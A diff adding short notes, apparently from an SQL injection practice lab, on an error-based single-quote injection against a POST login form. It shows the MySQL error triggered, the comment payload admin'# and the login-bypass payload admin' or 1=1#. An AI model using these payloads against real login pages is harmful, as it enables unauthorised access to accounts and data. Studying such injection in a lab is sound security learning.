@@ -1,0 +1,15 @@
+POST-ERROR BASED SINGLE QUOTES
+
+We have to login by entering a username and password
+
+when we add a single quote next to "admin" we get an error
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' LIMIT 0,1' at line 1
+
+We need to fix the error by using '#' 
+username & password :admin'#
+
+query used is 
+Select * from TABLE where username= (“$uname”) and password=(“$password”) limit 0,1
+
+username and password :admin' or 1=1#
+
